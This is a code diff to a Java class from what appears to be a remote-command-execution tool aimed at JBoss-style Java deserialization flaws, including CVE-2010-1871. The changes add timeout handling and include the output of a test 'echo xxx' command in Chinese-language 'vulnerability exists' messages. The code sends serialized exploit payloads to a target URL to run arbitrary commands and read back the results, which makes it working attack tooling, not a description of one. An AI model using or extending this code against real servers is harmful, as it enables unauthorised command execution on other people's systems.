@@ -132,13 +132,18 @@ public class UtilMethod {
             if (!flag) {
                 try {
                     payload = GenPoc.getObject("../.readme.html.tmp", null);
-                    MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
+                    byte[] b = MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
+                    if (b == null) {
+                        result = "失败，可能访问超时！";
+                        return result;
+                    }
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
             }
             payload = GenPoc.expolit(cmd);
-            byte[] exploitResult = MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
+            byte[] exploitResult = new byte[0];
+            exploitResult = MainMethod.getPayloadResponse(url, "aplication/x-java-serialized-object", payload);
             result = GenPoc.getCommandResult(exploitResult);
         } else if (index == 3) { // CVE-2010-1871
             String httpResult;
@@ -258,32 +263,40 @@ public class UtilMethod {
                 String str4 = UtilMethod.commandExploit(4, targetUrl, "echo xxx", false);
                 if (str4.contains("未找到命令执行结果，命令可能执行失败！")) {
                     result = "未找到命令执行结果，命令可能执行失败！";
+                } else if (str4.contains("失败，可能访问超时！")) {
+                    result = str4;
                 } else {
-                    result = "存在" + Utils.bugs_mainTab[4] + "漏洞";
+                    result = "存在" + Utils.bugs_mainTab[4] + "漏洞" + "【echo xxx：" + str4 + "】";
                 }
                 break;
             case 5:
                 String str5 = UtilMethod.commandExploit(5, targetUrl, "echo xxx", false);
                 if (str5.contains("未找到命令执行结果，命令可能执行失败！")) {
                     result = "未找到命令执行结果，命令可能执行失败！";
+                } else if (str5.contains("失败，可能访问超时！")) {
+                    result = str5;
                 } else {
-                    result = "存在" + Utils.bugs_mainTab[5] + "漏洞";
+                    result = "存在" + Utils.bugs_mainTab[5] + "漏洞" + "【echo xxx：" + str5 + "】";
                 }
                 break;
             case 6:
                 String str6 = UtilMethod.commandExploit(6, targetUrl, "echo xxx", false);
                 if (str6.contains("未找到命令执行结果，命令可能执行失败！")) {
                     result = "未找到命令执行结果，命令可能执行失败！";
+                } else if (str6.contains("失败，可能访问超时！")) {
+                    result = str6;
                 } else {
-                    result = "存在" + Utils.bugs_mainTab[6] + "漏洞";
+                    result = "存在" + Utils.bugs_mainTab[6] + "漏洞" + "【echo xxx：" + str6 + "】";
                 }
                 break;
             case 7:
                 String str7 = UtilMethod.commandExploit(7, targetUrl, "echo xxx", false);
                 if (str7.contains("未找到命令执行结果，命令可能执行失败！")) {
                     result = "未找到命令执行结果，命令可能执行失败！";
+                } else if (str7.contains("失败，可能访问超时！")) {
+                    result = str7;
                 } else {
-                    result = "存在" + Utils.bugs_mainTab[7] + "漏洞";
+                    result = "存在" + Utils.bugs_mainTab[7] + "漏洞" + "【echo xxx：" + str7 + "】";
                 }
                 break;
         }
